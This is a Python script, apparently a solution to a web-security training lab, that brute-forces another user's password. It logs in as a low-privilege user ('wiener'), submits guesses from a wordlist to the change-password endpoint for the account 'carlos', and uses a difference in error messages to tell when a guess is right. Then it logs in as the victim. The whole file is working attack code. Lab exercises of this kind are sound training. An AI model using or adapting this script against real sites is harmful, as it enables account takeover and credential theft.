import sys
import requests
import urllib3
import urllib.parse

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}


def brut_forcer(s,url): 

    #first login as wiener
    data = {"username":"wiener","password":"peter"}
    r= s.post(f"{url}/login",data=data,verify = False, proxies = proxies)
    if "Log out" in r.text:
         print ("(+) Login as wiener successful")
    else:
         print ("(+) Login as wiener failed")

    print("Brute forcing password for carlos")     
         
    with open("pass.txt", "r") as passwords:
        for line in passwords:
                password = line.strip()
                data = {"username":"carlos","current-password":password,'new-password-1':'nn','new-password-2':'n'}
                response = s.post(f"{url}/my-account/change-password",data=data,verify = False, proxies = proxies)
                if "New passwords do not match" in response.text:
                    print (f"\nsuccess! the passwword is:{password}")
                    break
                else:
                    print(f"tried code: {password}")

    print("Logging out as wiener")
    r= s.get(f"{url}/logout",verify = False, proxies = proxies)
    if "Log out" not in r.text:
         print ("(+) Loged out as wiener")
    else:
         print ("(+) Failed to log out as wiener")

    print("Logging in as carlos")
    data = {"username":"carlos","password":password}
    r= s.post(f"{url}/login",data=data,verify = False, proxies = proxies)
    if "Log out" in r.text:
         print ("(+) Login as carlos successful")
    else:
         print ("(+) Login as carlos failed")      
             

                 
                

def main():
    if len(sys.argv) !=2:
        print("(+) Usage: %s <url>" % sys.argv[0])
        print("(+) Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)
    s = requests.Session()    
    url = sys.argv[1]
    print("(+)  Starting Brute Froce...")
    brut_forcer(s,url)
    
    




if __name__ == "__main__":
    main()